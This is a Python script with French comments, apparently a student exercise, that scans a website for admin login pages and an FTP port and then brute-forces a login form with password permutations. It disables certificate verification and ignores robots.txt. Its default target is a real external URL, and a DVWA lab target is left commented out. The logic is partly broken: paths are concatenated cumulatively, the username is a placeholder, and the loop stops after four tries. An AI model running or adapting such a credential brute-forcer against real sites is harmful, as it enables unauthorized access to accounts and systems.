#!/usr/bin/python
import mechanize 
import itertools
import ssl
from bs4 import BeautifulSoup as btfs

class BT:
    def __init__(self,url,usertag,pwdtag):
        self.url=url
        self.usertag=usertag
        self.pwdtag=pwdtag
        self.listpwd=itertools.permutations("i34U^hP-",8) #Path file

    # def Initialisation(self):
    #     print("Veuillez saisir l'URL:")
    #     self.url = input();
    #     print("Saisir le tag du username:")
    #     self.usertag = input();
    #     print("Saisir le tage du password:")
    #     self.pwdtag = input()
    #     self.listpwd = itertools.permutations("i34U^hP-",8) 
    
    def SearchConsoleAdmin(self):
        
        br = mechanize.Browser()
        exist = True
        try:
            self.url = self.url + "/admin/"
            reponse = br.open(self.url)
        except:
            print("Page /admin/ inaccessible")
            exist = False
        
        if(exist == True):
            print("Page /admin/ accessible")
        
        exist = True
        try:
            self.url = self.url + "/administrator/"
            reponse = br.open(self.url)
        except:
            print("Page /administrator/ inaccessible")
            exist = False
        
        if(exist == True):
            print("Page /administrator/ accessible")
        
        exist = True
        try:
            self.url = self.url + "/admin.php"
            reponse = br.open(self.url)
        except:
            print("Page /admin.php inaccessible")
            exist = False
        
        if(exist == True):
            print("Page /admin.php accessible")
            
        exist = True
        try:
            self.url = self.url + "/wp-login.php"
            reponse = br.open(self.url)
        except:
            print("Page /wp-login.php inaccessible")
            exist = False
        
        if(exist == True):
            print("Page /wp-login.php accessible")
            
        exist = True
        try:
            self.url = self.url + ":21"
            reponse = br.open(self.url)
        except:
            print("Port FTP 21 inaccessible")
            exist = False
        
        if(exist == True):
            print("Port FTP 21 accessible")
            
    
    def CheckReponse(self,txt):
        # on Check si la contient un mot comme "incorrect", il faudrait une liste d'autres mots
        txt = btfs(txt,"lxml").get_text()
        txt= " ".join(item.strip().lower() for item in txt.split("\n")).split(" ")
        if("failed" in txt):
            #print("Failed auth")
            return True
        return False

    def Attack(self):
        ssl._create_default_https_context = ssl._create_unverified_context
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        compteur = 0
        combos= self.listpwd 
        reponse = br.open(self.url)
#        for form in br.forms():
#            print(form)

        try:
            for x in combos:
                br.set_response(reponse)
                br.select_form( nr = 0 )
                br.form[self.usertag] = "user name"
                br.form[self.pwdtag] = ''.join(x)
                print("Checking user:",br.form[self.usertag]," password:",br.form[self.pwdtag])
                reponse = br.submit()
                if(self.CheckReponse(reponse.read())):
                    print("Incorrect")
                #print("Code reponse HTTP",reponse.getcode())
                compteur+=1
                if(compteur == 4):
                    break
        except :
            print("Site sécurisé")


b = BT("http://www.rx3.net/~a2gibert/toto.php","email","password")
#b = BT("http://127.0.0.1/DVWA/vulnerabilities/brute/","username","password")
#b.Initialisation() #L'utilisateur saisit les infos necessaire au programme
#b.Attack()
b.SearchConsoleAdmin()